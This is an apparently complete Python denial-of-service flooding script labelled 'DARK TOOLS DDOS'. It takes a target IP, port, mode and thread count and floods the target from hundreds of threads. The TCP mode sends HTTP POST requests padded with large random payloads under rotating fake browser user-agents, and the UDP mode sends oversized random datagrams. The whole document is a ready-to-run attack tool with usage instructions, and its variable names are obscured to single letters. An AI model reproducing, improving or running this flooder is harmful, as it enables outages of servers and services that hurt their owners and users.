#⟡ RECURSIVE OUTPUT ⟡
#DARK TOOLS DDOS HINDI DDS
#!/usr/bin/python3

import time,sys,socket,threading,random,os,signal
from queue import Queue
from optparse import OptionParser

def a():
    global b
    b=[]
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15")
    b.append("Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/118.0.5993.88 Safari/537.36")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0")
    b.append("Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0")
    b.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1")
    return b

def c():
    return os.urandom(random.randint(16384, 65536))

def d():
    e = os.urandom(random.randint(32768, 131072))
    f = ("POST / HTTP/1.1\r\nHost: " + g + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nCache-Control: no-cache\r\nContent-Length: " + str(len(e)) + "\r\nContent-Type: application/octet-stream\r\nConnection: keep-alive\r\n\r\n").encode() + e
    return f

def h():
    try:
        while True:
            i = d()
            j = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            j.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            j.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            j.settimeout(1)
            j.connect((g, int(k)))
            j.sendall(i)
            try:
                j.recv(4096)
            except:
                pass
            j.close()
            time.sleep(0.0001)
    except:
        time.sleep(0.0001)

def l():
    try:
        while True:
            m = c()
            n = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            n.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            n.sendto(m, (g, int(k)))
            n.close()
            time.sleep(0.00005)
    except:
        time.sleep(0.00005)

def o():
    while True:
        p = q.get()
        h()
        q.task_done()

def r():
    while True:
        p = s.get()
        l()
        s.task_done()

def t():
    print('''    
 Usage: python3 spam.py -s <ip> -m <mode> [-p <port>] [-t <threads>]
    -h : help
    -s : target ip
    -m : mode (tcp / udp / both)
    -p : port (default 80)
    -t : threads (default 500)''')
    sys.exit()

def u():
    global g,k,v,w
    optp = OptionParser(add_help_option=False)
    optp.add_option("-s", "--server", dest="g")
    optp.add_option("-m", "--mode", dest="w")
    optp.add_option("-p", "--port", type="int", dest="k")
    optp.add_option("-t", "--threads", type="int", dest="v")
    optp.add_option("-h", "--help", dest="x", action='store_true')
    opts, args = optp.parse_args()
    if opts.x:
        t()
    if opts.g is None:
        t()
    g = opts.g
    w = opts.w if opts.w is not None else "both"
    if w not in ["tcp","udp","both"]:
        t()
    k = opts.k if opts.k is not None else 80
    v = opts.v if opts.v is not None else 500

q = Queue()
s = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 3:
        t()
    u()
    a()
    print(g, k, v, w)
    signal.signal(signal.SIGINT, lambda y,z: sys.exit(0))
    try:
        aa = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        aa.settimeout(1)
        aa.connect((g, int(k)))
        aa.close()
    except:
        pass
    if w in ["tcp","both"]:
        for _ in range(int(v)):
            ab = threading.Thread(target=o)
            ab.daemon = True
            ab.start()
    if w in ["udp","both"]:
        for _ in range(int(v/2)):
            ab = threading.Thread(target=r)
            ab.daemon = True
            ab.start()
    while True:
        for _ in range(int(v)):
            if w in ["tcp","both"]:
                q.put(_)
            if w in ["udp","both"]:
                s.put(_)
        time.sleep(0.00001)
